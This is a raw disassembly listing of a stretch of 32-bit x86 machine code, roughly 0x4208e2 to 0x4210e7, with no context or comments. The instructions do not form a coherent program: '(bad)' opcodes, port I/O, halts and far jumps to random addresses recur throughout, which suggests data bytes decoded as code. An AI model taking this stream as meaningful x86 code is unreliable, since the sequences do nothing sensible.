  4208e2:	mov    esi,0x2095f394
  4208e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208e8:	gs test eax,0xe484eed7
  4208ee:	xchg   esp,eax
  4208ef:	cmp    ah,BYTE PTR [ebx+eax*8]
  4208f2:	cmc    
  4208f3:	repnz and al,0xc5
  4208f6:	and    al,0x77
  4208f8:	pop    ebp
  4208f9:	imul   esi,DWORD PTR [esi*8+0x1f420716],0xbcb981d9
  420904:	inc    edx
  420905:	jg     0x4208ba
  420907:	cmp    DWORD PTR [esi-0x63],0xffffffb4
  42090b:	aam    0x95
  42090d:	push   esp
  42090e:	inc    edi
  42090f:	(bad)  
  420910:	xchg   ebp,eax
  420911:	daa    
  420912:	jl     0x4208f9
  420914:	and    BYTE PTR ds:0x3922efee,0xa9
  42091b:	pop    eax
  42091c:	cld    
  42091d:	dec    edi
  42091e:	aas    
  42091f:	lods   al,BYTE PTR ds:[esi]
  420920:	xor    bl,BYTE PTR [edi+0x2757ee3b]
  420926:	adc    al,al
  420928:	jmp    0x9ece4a2e
  42092d:	out    dx,al
  42092e:	sbb    eax,DWORD PTR [edi]
  420930:	mov    ch,0x53
  420932:	mov    dl,0x64
  420934:	mov    dh,0x86
  420936:	sub    ebp,DWORD PTR [esi*8-0x3c112b52]
  42093d:	mov    ebp,ds
  42093f:	jno    0x420966
  420941:	pop    ecx
  420942:	call   0xed1f3d98
  420947:	lea    esi,[esi-0x1d]
  42094a:	sbb    al,0x38
  42094c:	dec    ebx
  42094d:	sub    DWORD PTR [edx-0x4f476d98],0x24
  420954:	mov    WORD PTR ds:0xa6886dcc,?
  42095a:	cmp    ebx,DWORD PTR [ecx+0x19]
  42095d:	sub    eax,0xa3725673
  420962:	(bad)  [eax+ebp*1]
  420965:	icebp  
  420966:	sub    eax,0x6b78fddb
  42096b:	sar    DWORD PTR [edi+0xf587b9f],1
  420971:	inc    edi
  420972:	clc    
  420973:	mov    es,WORD PTR [esi+0x743d8bc5]
  420979:	sub    al,0x5d
  42097b:	adc    esp,DWORD PTR [edx]
  42097d:	lea    ebp,[esp+eax*8+0x53d87925]
  420984:	mov    ds:0x277ebc58,al
  420989:	jae    0x42094e
  42098b:	inc    ebx
  42098c:	(bad)  
  42098d:	mov    ch,0xb
  42098f:	in     al,0xdf
  420991:	in     eax,0xd6
  420993:	fmul   st,st(5)
  420995:	cmp    al,0xdf
  420997:	jmp    0xb30d6f0a
  42099c:	(bad)  
  42099d:	and    BYTE PTR [ebx+0x54],0x3d
  4209a1:	call   0xc4ea:0x8269b3cb
  4209a8:	push   ebx
  4209a9:	push   ebp
  4209aa:	fistp  WORD PTR [ebp-0x79]
  4209ad:	inc    edx
  4209ae:	shl    DWORD PTR [eax+eax*8+0x2b],0x3f
  4209b3:	dec    esi
  4209b4:	jae    0x4209c4
  4209b6:	mov    esp,0x242938c1
  4209bb:	or     edx,ebp
  4209bd:	pop    ss
  4209be:	addr16 jmp 0x7e88:0x6618a9d1
  4209c6:	xchg   esp,eax
  4209c7:	fidivr DWORD PTR [ecx-0x25]
  4209ca:	outs   dx,BYTE PTR ds:[esi]
  4209cb:	jmp    0xf3be:0xffdba696
  4209d2:	push   edx
  4209d3:	push   ebx
  4209d4:	fcomi  st,st(6)
  4209d6:	pop    ss
  4209d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d8:	out    0xd9,eax
  4209da:	jmp    0xe468c643
  4209df:	mov    ch,0x80
  4209e1:	mov    ds:0x22fbd75b,al
  4209e6:	dec    ebx
  4209e7:	call   0x95533b8a
  4209ec:	xchg   BYTE PTR [edi],bh
  4209ee:	mov    bl,0x14
  4209f0:	inc    ecx
  4209f1:	push   ds
  4209f2:	out    dx,al
  4209f3:	xchg   ecx,eax
  4209f4:	(bad)  
  4209f5:	sub    DWORD PTR [ebx+0x1c],esi
  4209f8:	and    eax,0x416531ae
  4209fd:	or     al,0x38
  4209ff:	jb     0x4209e4
  420a01:	inc    ecx
  420a02:	mov    esp,0xe054364
  420a07:	xchg   ebx,eax
  420a08:	xchg   esi,eax
  420a09:	jmp    0xc972680d
  420a0e:	outs   dx,BYTE PTR ds:[esi]
  420a0f:	xlat   BYTE PTR ds:[ebx]
  420a10:	cwde   
  420a11:	mov    dh,0x21
  420a13:	xchg   edx,eax
  420a14:	mov    esi,0x79f194b8
  420a19:	ins    BYTE PTR es:[edi],dx
  420a1a:	cmp    al,0x99
  420a1c:	jbe    0x4209dd
  420a1e:	mov    bl,0xfa
  420a20:	jg     0x4209ca
  420a22:	jnp    0x420a96
  420a24:	aam    0xc0
  420a26:	rcl    bl,0x67
  420a29:	popa   
  420a2a:	pop    edi
  420a2b:	bound  ebx,QWORD PTR [esi]
  420a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a2e:	cmp    ebx,DWORD PTR [edx+0x41]
  420a31:	and    al,0xfc
  420a33:	lds    esi,FWORD PTR [ebx-0x59]
  420a36:	pop    ebx
  420a37:	lds    esp,FWORD PTR [ecx+0x2c]
  420a3a:	aam    0x86
  420a3c:	shl    DWORD PTR [ebx+0x53],1
  420a3f:	pop    edi
  420a40:	jge    0x420a21
  420a42:	mov    dh,0xc4
  420a44:	jecxz  0x420a3b
  420a46:	and    DWORD PTR [ecx-0xc48c8a6],esi
  420a4c:	xchg   ebp,eax
  420a4d:	push   cs
  420a4e:	into   
  420a4f:	jmp    0x10e7:0x9d056473
  420a56:	push   edi
  420a57:	dec    esp
  420a58:	push   cs
  420a59:	fbstp  TBYTE PTR [esp+eax*4+0x7cbf1393]
  420a60:	aad    0x61
  420a62:	icebp  
  420a63:	jmp    0x6d08:0xc91a58c3
  420a6a:	pop    edi
  420a6b:	enter  0x1b3d,0x50
  420a6f:	in     al,dx
  420a70:	sub    eax,edx
  420a72:	dec    edi
  420a73:	mov    edi,0xf35ca775
  420a78:	(bad)  
  420a79:	aam    0xc8
  420a7b:	xchg   edi,eax
  420a7c:	jle    0x420ac8
  420a7e:	es push edi
  420a80:	sbb    DWORD PTR [ecx+0x4e],ecx
  420a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a84:	jbe    0x420a33
  420a86:	add    DWORD PTR ds:0xe59b5405,0x11
  420a8d:	cli    
  420a8e:	addr16 cli 
  420a90:	push   cs
  420a91:	dec    edx
  420a92:	inc    edx
  420a93:	push   cs
  420a94:	mov    DWORD PTR es:[edx],esi
  420a97:	cli    
  420a98:	ins    DWORD PTR es:[edi],dx
  420a99:	and    dh,BYTE PTR [ebp+ebp*8-0x1d1464f0]
  420aa0:	das    
  420aa1:	data16 aad 0x32
  420aa4:	and    dl,0x7b
  420aa7:	xor    DWORD PTR [edi],edx
  420aa9:	pop    ecx
  420aaa:	cmp    al,0x0
  420aac:	mov    eax,0x61e08a0f
  420ab1:	mov    ds:0x1bd8dbb9,al
  420ab6:	aas    
  420ab7:	dec    ebx
  420ab8:	inc    ebp
  420ab9:	fisttp WORD PTR [ebp-0x15]
  420abc:	div    DWORD PTR ss:[eax+0x32]
  420ac0:	hlt    
  420ac1:	xchg   ebx,eax
  420ac2:	loopne 0x420b08
  420ac4:	cmc    
  420ac5:	pushf  
  420ac6:	xchg   esp,eax
  420ac7:	cs push esi
  420ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aca:	sub    esi,edi
  420acc:	push   eax
  420acd:	les    esi,FWORD PTR [edi-0x507510f0]
  420ad3:	sbb    cl,BYTE PTR [ebx]
  420ad5:	dec    esp
  420ad6:	mov    ecx,0xb6a08134
  420adb:	mov    esi,0xe5bbad45
  420ae0:	mov    ecx,0x25603b74
  420ae5:	test   eax,0x90fa2c23
  420aea:	pop    edx
  420aeb:	push   edx
  420aec:	dec    eax
  420aed:	sbb    al,0x7f
  420aef:	mov    bl,0xdd
  420af1:	mul    bl
  420af3:	jb     0x420b29
  420af5:	sar    BYTE PTR [ebx+0x68718564],cl
  420afb:	scas   eax,DWORD PTR es:[edi]
  420afc:	pushf  
  420afd:	cmp    BYTE PTR [edi+0x37384d04],bh
  420b03:	clc    
  420b04:	xor    eax,0x86e9e9b4
  420b09:	ins    BYTE PTR es:[edi],dx
  420b0a:	inc    ebx
  420b0b:	and    ah,BYTE PTR [ecx+ecx*2]
  420b0e:	int    0x40
  420b10:	jae    0x420b61
  420b12:	xchg   ecx,eax
  420b13:	das    
  420b14:	loope  0x420aa3
  420b16:	cmp    al,0x65
  420b18:	ror    DWORD PTR [ebx],cl
  420b1a:	rol    DWORD PTR [ecx+0x6c],cl
  420b1d:	arpl   WORD PTR [edx+0x10a918c8],si
  420b23:	push   es
  420b24:	add    al,0xe7
  420b26:	dec    edi
  420b27:	jmp    0x420b86
  420b29:	pushf  
  420b2a:	imul   ecx,DWORD PTR [ebp+0xa5567da],0x72
  420b31:	in     eax,dx
  420b32:	lea    eax,[ecx]
  420b34:	cmp    eax,0x34b4b5fc
  420b39:	pop    ecx
  420b3a:	jg     0x420b68
  420b3c:	(bad)  
  420b3d:	or     al,0xba
  420b3f:	sahf   
  420b40:	and    al,0x1
  420b42:	and    al,0x81
  420b44:	pop    ecx
  420b45:	jne    0x420b73
  420b47:	fst    DWORD PTR [ebx]
  420b49:	test   DWORD PTR [edx-0x6210d06c],esi
  420b4f:	fdiv   DWORD PTR [esi+0x205e3983]
  420b55:	sahf   
  420b56:	ins    BYTE PTR es:[edi],dx
  420b57:	imul   ebx,DWORD PTR [ecx-0x761c96cf],0x6f8c2ba9
  420b61:	enter  0xba0b,0x54
  420b65:	adc    edi,DWORD PTR [ebx+0x7a2f7767]
  420b6b:	loop   0x420bca
  420b6d:	sub    DWORD PTR [ebx],ecx
  420b6f:	in     eax,0xd1
  420b71:	loope  0x420b9b
  420b73:	in     al,dx
  420b74:	add    al,0xbe
  420b77:	les    edx,FWORD PTR [eax+0x5e]
  420b7a:	or     eax,0x43950654
  420b7f:	pusha  
  420b80:	add    ebx,DWORD PTR [esi-0x50d97a92]
  420b86:	mov    bh,0xc8
  420b88:	sub    al,BYTE PTR [eax-0x7ce0eb4c]
  420b8e:	popa   
  420b8f:	dec    ebx
  420b90:	xor    eax,0x57e876b3
  420b95:	inc    ecx
  420b96:	loope  0x420bfe
  420b98:	add    bh,BYTE PTR [ebx-0x2a]
  420b9b:	imul   ebx,DWORD PTR [ebx],0x5
  420b9e:	in     eax,dx
  420b9f:	in     eax,0x4e
  420ba1:	setnp  BYTE PTR [ebp+0x65]
  420ba5:	mov    bh,0x1f
  420ba7:	in     eax,dx
  420ba8:	mov    ecx,0x3e41518e
  420bad:	or     esp,ebx
  420baf:	cmc    
  420bb0:	ins    BYTE PTR es:[edi],dx
  420bb1:	mov    ah,0xdd
  420bb3:	push   es
  420bb4:	leave  
  420bb5:	jmp    0x420bcb
  420bb7:	lock or bp,bx
  420bbb:	adc    al,0xe5
  420bbd:	mov    ds:0xc1218498,al
  420bc2:	scas   al,BYTE PTR es:[edi]
  420bc3:	test   BYTE PTR [edx-0xb],ah
  420bc6:	mov    dh,0x8e
  420bc8:	fidivr WORD PTR [edi-0x598e7a6d]
  420bce:	xor    eax,0x21
  420bd1:	repnz pop ebx
  420bd3:	mov    dl,0x1
  420bd5:	xchg   ecx,eax
  420bd6:	mov    DWORD PTR [edi+0x26],edx
  420bd9:	test   al,0x10
  420bdb:	(bad)  
  420bdc:	in     al,dx
  420bdd:	loope  0x420b9f
  420bdf:	mov    eax,0xaf5ca372
  420be4:	mov    eax,DWORD PTR [edx]
  420be6:	xchg   ecx,eax
  420be7:	adc    eax,0xe62a3cff
  420bec:	sub    BYTE PTR [ebx-0x5a5e5915],bl
  420bf2:	pop    edx
  420bf3:	mov    WORD PTR [esi+0x4b6ac0bf],es
  420bf9:	iret   
  420bfa:	js     0x420c13
  420bfc:	or     eax,0x8c24b204
  420c01:	nop
  420c02:	pop    edi
  420c03:	and    eax,0xc159211c
  420c08:	cmp    cl,BYTE PTR [eax+0x2d]
  420c0b:	mov    DWORD PTR [esi],edx
  420c0d:	pop    ecx
  420c0e:	add    ch,BYTE PTR [edi]
  420c10:	sbb    DWORD PTR [ebx-0x5a722340],eax
  420c16:	fwait
  420c17:	and    al,BYTE PTR [edx]
  420c19:	sbb    ebp,esp
  420c1b:	popf   
  420c1c:	lods   eax,DWORD PTR ds:[esi]
  420c1d:	retf   0x3b88
  420c20:	sahf   
  420c21:	cmp    al,0xbc
  420c23:	je     0x420bb3
  420c25:	dec    esi
  420c26:	xor    DWORD PTR [eax-0xa],esi
  420c29:	pop    es
  420c2a:	in     eax,dx
  420c2b:	push   ds
  420c2c:	xchg   edx,eax
  420c2d:	les    edx,FWORD PTR [edx+ecx*2+0x51]
  420c31:	xchg   esp,eax
  420c32:	ds (bad) 
  420c34:	jbe    0x420be3
  420c36:	mov    ebx,0xd2619754
  420c3b:	sub    DWORD PTR [ebp+0x52e560f1],eax
  420c41:	mov    dx,0x1b0b
  420c45:	mov    DWORD PTR [ecx+0x57],esp
  420c48:	sbb    edx,ebp
  420c4a:	loop   0x420c0b
  420c4c:	jns    0x420bf0
  420c4e:	sbb    esi,edi
  420c50:	push   0xd7e2a169
  420c55:	mov    esp,0xa683e92e
  420c5a:	mov    edi,DWORD PTR [eax]
  420c5c:	fnsave [ebx+0xc]
  420c5f:	jecxz  0x420c7a
  420c61:	dec    eax
  420c62:	sub    dh,BYTE PTR [esi+0x5d]
  420c65:	xchg   ebp,eax
  420c66:	scas   eax,DWORD PTR es:[edi]
  420c67:	stos   BYTE PTR es:[edi],al
  420c68:	mov    ds:0x1ae8ce5,eax
  420c6d:	ficomp DWORD PTR [eax-0x47bfbbab]
  420c73:	(bad)  
  420c74:	sbb    al,BYTE PTR [eax+0x4fc5f78b]
  420c7a:	mov    ebx,0xe5b555d4
  420c7f:	jno    0x420ca6
  420c81:	push   edi
  420c82:	test   eax,0x50e6e6dc
  420c87:	mov    ds:0x3ef76fc,eax
  420c8c:	adc    ecx,DWORD PTR [ebp-0x4733ab44]
  420c92:	sti    
  420c93:	loope  0x420c98
  420c95:	gs sti 
  420c97:	lea    ebp,[ebx-0x6344379e]
  420c9d:	cmp    al,0x56
  420c9f:	pop    esi
  420ca0:	xor    eax,0x41e9c258
  420ca5:	imul   eax,edx,0x718c3791
  420cab:	xlat   BYTE PTR ds:[ebx]
  420cac:	mov    ds:0xd2d873a4,eax
  420cb1:	cmp    bh,BYTE PTR [eax+0xa]
  420cb4:	push   ss
  420cb5:	cmp    DWORD PTR [esi-0xdcafa78],edi
  420cbb:	stos   BYTE PTR es:[edi],al
  420cbc:	dec    ebx
  420cbd:	fwait
  420cbe:	sti    
  420cbf:	inc    eax
  420cc0:	int    0xf
  420cc2:	dec    esi
  420cc3:	sahf   
  420cc4:	inc    ecx
  420cc5:	neg    DWORD PTR [ebp-0x4d1a4b97]
  420ccb:	inc    esp
  420ccc:	ds jecxz 0x420d2c
  420ccf:	mov    ebx,0xf3992cda
  420cd4:	push   ebp
  420cd5:	xor    edx,DWORD PTR [edi-0x16]
  420cd8:	sbb    al,0x7d
  420cda:	sub    esp,DWORD PTR [edx+eax*2-0x589ff176]
  420ce1:	imul   ecx,DWORD PTR [ebx+ebp*2-0x19fac243],0xb40b9cb3
  420cec:	or     al,bh
  420cee:	push   0x8d62f108
  420cf3:	lods   al,BYTE PTR ds:[esi]
  420cf4:	mov    dl,0x1d
  420cf6:	mov    al,0x84
  420cf8:	or     al,0x29
  420cfa:	sbb    BYTE PTR [ebp-0x1606e2bb],dl
  420d00:	pop    ds
  420d01:	out    dx,eax
  420d02:	pushf  
  420d03:	mov    ah,BYTE PTR ds:0xa043ece7
  420d09:	mov    eax,DWORD PTR [eax-0x4bee3eba]
  420d0f:	nop
  420d10:	mov    ss:0x7a36f22b,eax
  420d16:	dec    esp
  420d17:	test   DWORD PTR [edx+0x38c906a1],0xd644bde2
  420d21:	push   ecx
  420d22:	pop    ebp
  420d23:	dec    esp
  420d24:	push   ebp
  420d25:	mov    ah,0x9
  420d27:	call   0x779f6867
  420d2c:	and    ebx,DWORD PTR [ecx]
  420d2e:	add    ah,BYTE PTR [eax]
  420d30:	iret   
  420d31:	fist   DWORD PTR [esi+edx*2]
  420d34:	dec    esi
  420d35:	adc    al,0x2c
  420d37:	retf   0x84c5
  420d3a:	push   edi
  420d3b:	pop    esi
  420d3c:	pop    esi
  420d3d:	push   edi
  420d3e:	jge    0x420d4a
  420d40:	and    BYTE PTR [edx+esi*4],dl
  420d43:	lods   al,BYTE PTR ds:[esi]
  420d44:	sbb    ebp,DWORD PTR [ecx+0x62]
  420d47:	test   BYTE PTR [esi+0x17],dh
  420d4a:	loopne 0x420d91
  420d4c:	jno    0x420ce7
  420d4e:	sbb    ebp,DWORD PTR [ebx+0x7b]
  420d51:	cmp    esi,DWORD PTR ds:0x623f358
  420d57:	mov    DWORD PTR [esi+esi*2],esp
  420d5a:	mov    edx,0xcb38ca54
  420d5f:	push   eax
  420d60:	cmc    
  420d61:	mov    ch,BYTE PTR [edi]
  420d63:	repnz or al,0x85
  420d66:	mov    al,0xb
  420d68:	neg    DWORD PTR [eax+0x21]
  420d6b:	mov    esi,0x74b417ab
  420d70:	xor    eax,eax
  420d72:	pop    esp
  420d73:	mov    eax,ds:0x23bbebf6
  420d78:	clc    
  420d79:	mov    esi,0xcd5c8801
  420d7e:	mov    al,0x73
  420d80:	cmp    DWORD PTR [eax],0xffffffb4
  420d83:	hlt    
  420d84:	icebp  
  420d85:	jae    0x420d97
  420d87:	mov    dh,0xc5
  420d89:	fs mov ebp,0xdb725eeb
  420d8f:	stos   DWORD PTR es:[edi],eax
  420d90:	out    0x50,al
  420d92:	gs add ch,bh
  420d95:	icebp  
  420d96:	fst    DWORD PTR [esp+eiz*4-0x5a]
  420d9a:	add    DWORD PTR [ebp+0x5dbba23b],ebx
  420da0:	jp     0x420db5
  420da2:	cmp    eax,0x540a3d29
  420da7:	sahf   
  420da8:	jmp    0xbb97:0x5994bfb1
  420daf:	adc    eax,0xf87188c5
  420db4:	hlt    
  420db5:	test   BYTE PTR [edi-0x63792c0a],bh
  420dbb:	test   eax,0x44bfbbd7
  420dc0:	ds in  eax,0xb1
  420dc3:	dec    edx
  420dc4:	in     eax,0x30
  420dc6:	iret   
  420dc7:	in     eax,0xc5
  420dc9:	push   0x7a
  420dcb:	shl    DWORD PTR [edx],0xa9
  420dce:	arpl   WORD PTR [ecx],bp
  420dd0:	xchg   edx,eax
  420dd1:	pop    ds
  420dd2:	icebp  
  420dd3:	xlat   BYTE PTR ds:[ebx]
  420dd4:	mov    DWORD PTR [ebx+edi*1+0x2fad15bd],ebx
  420ddb:	xchg   ecx,eax
  420ddc:	pop    si
  420dde:	stc    
  420ddf:	imul   ebx,DWORD PTR [eax-0x7a6b4c08],0x6b4de365
  420de9:	add    eax,DWORD PTR [ebx-0x4401874f]
  420def:	adc    al,0x7b
  420df1:	xchg   ebx,eax
  420df2:	push   edx
  420df3:	pop    ds
  420df4:	and    BYTE PTR [ecx],bh
  420df6:	call   0x593:0x67d648cc
  420dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dfe:	or     bh,BYTE PTR [ebx-0x6b]
  420e01:	fadd   QWORD PTR [esi]
  420e03:	in     al,dx
  420e04:	fild   QWORD PTR [ebx+0x792336e3]
  420e0a:	sbb    edx,edi
  420e0c:	lods   eax,DWORD PTR ds:[esi]
  420e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e0e:	mov    esi,0x915f2355
  420e13:	push   ebp
  420e14:	sbb    ch,cl
  420e16:	(bad)  
  420e17:	jmp    0xef5e6968
  420e1c:	mov    al,0xb0
  420e1e:	test   al,0xb9
  420e20:	loop   0x420e2f
  420e22:	jle    0x420dca
  420e24:	and    edx,DWORD PTR [ebp-0x59]
  420e27:	mov    dh,0x7a
  420e29:	cmp    al,0xe1
  420e2b:	add    al,0x45
  420e2d:	inc    edx
  420e2e:	mov    edi,0xf1513de7
  420e33:	test   DWORD PTR [edx],0xa06fd2a
  420e39:	mov    al,ds:0x36514d6f
  420e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e3f:	push   ecx
  420e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e41:	inc    ebp
  420e42:	mov    al,0xcb
  420e44:	sub    eax,0x3470c6d
  420e49:	popa   
  420e4a:	push   0xffffffef
  420e4c:	push   ds
  420e4d:	cdq    
  420e4e:	or     DWORD PTR [ecx+0x1937586a],0x2d0ba648
  420e58:	inc    ecx
  420e59:	mov    al,0xe4
  420e5b:	cmp    ebp,edi
  420e5d:	ss repz ret 0xbad4
  420e62:	das    
  420e63:	jne    0x420e7f
  420e65:	das    
  420e66:	test   BYTE PTR [ecx+0x3fb9ae5],cl
  420e6c:	jmp    0xd89ce643
  420e71:	pop    esp
  420e72:	stc    
  420e73:	mov    ecx,0x383bb606
  420e78:	add    al,0xfa
  420e7a:	sti    
  420e7b:	int3   
  420e7c:	and    BYTE PTR [ebp+0x2b],ch
  420e7f:	pushf  
  420e80:	bound  ecx,QWORD PTR [esp+edi*8]
  420e83:	adc    BYTE PTR [ecx-0x64],cl
  420e86:	jno    0x420ece
  420e88:	and    BYTE PTR ds:0xfa2ccc82,ch
  420e8e:	cmp    eax,0xb9f3a010
  420e93:	hlt    
  420e94:	cmp    edx,DWORD PTR [ebp-0x7c]
  420e97:	fist   WORD PTR [ebx+eiz*2-0x2e791361]
  420e9e:	xor    al,0xd1
  420ea0:	ficomp DWORD PTR [esp+edx*2+0x16c2a905]
  420ea7:	and    al,0xb1
  420ea9:	js     0x420f23
  420eab:	push   esi
  420eac:	stc    
  420ead:	out    0xb3,eax
  420eaf:	dec    esp
  420eb0:	fstp   QWORD PTR [ecx+0x18e2801b]
  420eb6:	jp     0x420e57
  420eb8:	imul   edx,DWORD PTR [eax+0x3a],0xf
  420ebc:	add    DWORD PTR [edx],0xffffffa3
  420ebf:	lds    esp,FWORD PTR [ebp-0x5b]
  420ec2:	mov    ecx,esi
  420ec4:	pop    ds
  420ec5:	mov    WORD PTR ds:0x6fa058cb,?
  420ecb:	jne    0x420e7e
  420ecd:	sbb    ch,bl
  420ecf:	jnp    0x420eec
  420ed1:	dec    ecx
  420ed2:	(bad)  
  420ed3:	mov    eax,ds:0x62aa4ce1
  420ed8:	bound  edx,QWORD PTR [esi-0x35d53fc4]
  420ede:	fucomi st,st(7)
  420ee0:	adc    eax,0x1b2ebab9
  420ee5:	mov    DWORD PTR [ebx-0x38ece73a],esp
  420eeb:	cld    
  420eec:	xor    eax,0x7abc1bad
  420ef1:	push   es
  420ef2:	mov    ebx,0x6a5afa78
  420ef7:	jecxz  0x420ea5
  420ef9:	and    bh,bh
  420efb:	mov    eax,ds:0xe4c98e9f
  420f00:	(bad)  
  420f01:	out    dx,eax
  420f02:	cmp    ecx,ebx
  420f04:	cmp    eax,0x39837ba7
  420f09:	push   ebx
  420f0a:	cmp    ah,BYTE PTR [edi]
  420f0c:	xor    DWORD PTR [ebx-0x73],edx
  420f0f:	out    0xa6,al
  420f11:	push   esi
  420f12:	mov    al,0xf4
  420f14:	mov    edx,DWORD PTR [ebx+0x282646f1]
  420f1a:	and    DWORD PTR [eax+0x7e],edi
  420f1d:	clc    
  420f1e:	dec    esi
  420f1f:	in     al,dx
  420f20:	jp     0x420ec6
  420f22:	mov    bh,0xe4
  420f24:	sti    
  420f25:	fild   DWORD PTR [edx+0x4210084d]
  420f2c:	imul   ebx,DWORD PTR [edi-0x2b14adbf],0xffffffbc
  420f33:	push   esp
  420f34:	mov    dh,0xd8
  420f36:	in     al,0x1e
  420f38:	adc    eax,0x4df0c334
  420f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f3e:	outs   dx,DWORD PTR ds:[esi]
  420f3f:	test   al,0xd4
  420f41:	lods   al,BYTE PTR ds:[esi]
  420f42:	lds    esi,FWORD PTR [ebp-0xea7002b]
  420f48:	ds jl  0x420f2d
  420f4b:	push   eax
  420f4c:	xchg   DWORD PTR [ecx],ebp
  420f4e:	test   al,0xcc
  420f50:	leave  
  420f51:	fcmovnb st,st(3)
  420f53:	repnz add DWORD PTR [edx+0x2b],0xb32b495a
  420f5b:	and    al,0x11
  420f5d:	mov    ecx,0x1376df56
  420f62:	ss add al,0x19
  420f65:	xchg   DWORD PTR [ecx+0x12],eax
  420f68:	pop    es
  420f69:	dec    ecx
  420f6a:	out    dx,eax
  420f6b:	out    0xf2,eax
  420f6d:	idiv   BYTE PTR [edx-0x91f7747]
  420f73:	je     0x420f99
  420f75:	xor    DWORD PTR [edx+0x22],0x93d782f
  420f7c:	test   cl,0xd0
  420f7f:	jmp    0xe6bc8a09
  420f84:	dec    edi
  420f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f87:	addr16 pop edx
  420f89:	in     al,0xbc
  420f8b:	mov    ah,0x40
  420f8d:	mov    ch,0x9d
  420f8f:	outs   dx,BYTE PTR ds:[esi]
  420f90:	push   ss
  420f91:	pushf  
  420f92:	sbb    eax,0xd69d0362
  420f97:	push   edi
  420f98:	hlt    
  420f99:	push   0x9
  420f9b:	loopne 0x420fc1
  420f9d:	or     DWORD PTR [esi],esi
  420f9f:	mov    al,0x82
  420fa1:	push   ds
  420fa2:	in     al,dx
  420fa3:	adc    eax,0x80d6c38
  420fa8:	sub    al,0x9c
  420faa:	out    dx,eax
  420fab:	pop    ebx
  420fac:	pop    ss
  420fad:	dec    edi
  420fae:	in     al,dx
  420faf:	mov    bl,al
  420fb1:	cmp    al,0x8a
  420fb3:	lods   al,BYTE PTR ds:[esi]
  420fb4:	aad    0x54
  420fb6:	jne    0x420fab
  420fb8:	add    BYTE PTR [esi],dl
  420fba:	loop   0x421013
  420fbc:	jne    0x420fc5
  420fbe:	inc    ebx
  420fbf:	hlt    
  420fc0:	es (bad) 
  420fc2:	mov    ebp,0xd3991608
  420fc7:	mov    edx,0x82dc3864
  420fcc:	push   0x83ca1b9f
  420fd1:	jo     0x420fcc
  420fd3:	test   DWORD PTR [ecx+eiz*8+0xb24e7f],0xb44fa773
  420fde:	mov    dh,0x74
  420fe0:	cmp    al,0xb4
  420fe2:	mov    ebx,0x2791753e
  420fe7:	rcr    DWORD PTR [esi+0xcec985d],1
  420fed:	mov    edx,0xd81614eb
  420ff2:	push   ecx
  420ff3:	mov    eax,ds:0xf6499ac8
  420ff8:	aam    0xe5
  420ffa:	in     eax,dx
  420ffb:	push   edx
  420ffc:	mov    dl,0xa0
  420ffe:	sub    edi,DWORD PTR [ecx+0x31c3e761]
  421004:	pop    ebp
  421005:	ja     0x421073
  421007:	xchg   DWORD PTR [edx-0x47],esp
  42100a:	mov    cl,0xd4
  42100c:	cwde   
  42100d:	sbb    ah,BYTE PTR [edx+0xe]
  421010:	or     DWORD PTR [edx+edi*2-0x5b],edx
  421014:	adc    BYTE PTR ds:0x4bf92cba,0x67
  42101b:	pop    esi
  42101d:	ret    0x84b6
  421020:	push   ecx
  421021:	mov    dl,0xce
  421023:	xor    eax,0xd36b994d
  421028:	pop    es
  421029:	xchg   edx,eax
  42102a:	addr16 cmp eax,0x978bb275
  421030:	add    ebp,DWORD PTR [ecx]
  421032:	xchg   ebx,eax
  421033:	jbe    0x42106e
  421035:	or     BYTE PTR [ebx-0x654d115c],0x76
  42103c:	adc    ah,BYTE PTR [esi-0x4f]
  42103f:	jo     0x420fc2
  421041:	push   ebx
  421042:	mov    ecx,gs
  421044:	push   ebp
  421045:	loope  0x420fd6
  421047:	pop    esp
  421048:	in     eax,0xb0
  42104a:	mov    al,0x5c
  42104c:	pop    ss
  42104d:	jmp    0x142f25c2
  421052:	push   ss
  421053:	sub    eax,0x26abf456
  421058:	sbb    ebx,esp
  42105a:	and    al,0x7
  42105c:	or     eax,0x1ff28288
  421061:	fst    DWORD PTR [edx]
  421063:	sbb    al,0xdb
  421065:	jne    0x421015
  421067:	rcl    ah,cl
  421069:	cdq    
  42106a:	cmp    ecx,DWORD PTR ds:0xbcbe8615
  421070:	test   eax,0xa847553d
  421075:	bound  esi,QWORD PTR [edi-0x3655542c]
  42107b:	mov    ebp,0xee3f93c5
  421080:	(bad)  
  421081:	std    
  421082:	nop
  421083:	pushf  
  421084:	std    
  421085:	jmp    0x96b593ee
  42108a:	outs   dx,DWORD PTR ds:[esi]
  42108b:	enter  0x280d,0xb1
  42108f:	test   al,0xe2
  421091:	mov    ds:0x3bc7bc8b,al
  421096:	cli    
  421097:	leave  
  421098:	push   esi
  421099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42109a:	cli    
  42109b:	loope  0x42108f
  42109d:	mov    WORD PTR [esi+0x202529a4],?
  4210a3:	sub    eax,0xeec38445
  4210a8:	jge    0x421123
  4210aa:	sahf   
  4210ab:	hlt    
  4210ac:	sub    eax,0x72987689
  4210b1:	call   0xe8d9f247
  4210b6:	jle    0x421088
  4210b8:	mov    ebp,0x1e6e2b9b
  4210bd:	aam    0xc7
  4210bf:	inc    edx
  4210c0:	mul    DWORD PTR [esi]
  4210c2:	popa   
  4210c3:	inc    edx
  4210c4:	mov    al,0x25
  4210c6:	mov    esi,0xe3d93aa4
  4210cb:	lods   eax,DWORD PTR ds:[esi]
  4210cc:	and    eax,0x1fee2b0a
  4210d1:	jbe    0x421093
  4210d3:	out    dx,al
  4210d4:	xchg   DWORD PTR [ecx],edi
  4210d6:	add    eax,0x9a2952dd
  4210db:	sub    ah,BYTE PTR [edi+0x7]
  4210de:	mov    ebx,0x184d672e
  4210e3:	aad    0x2
  4210e5:	mov    cl,0xd1
  4210e7:	leave  
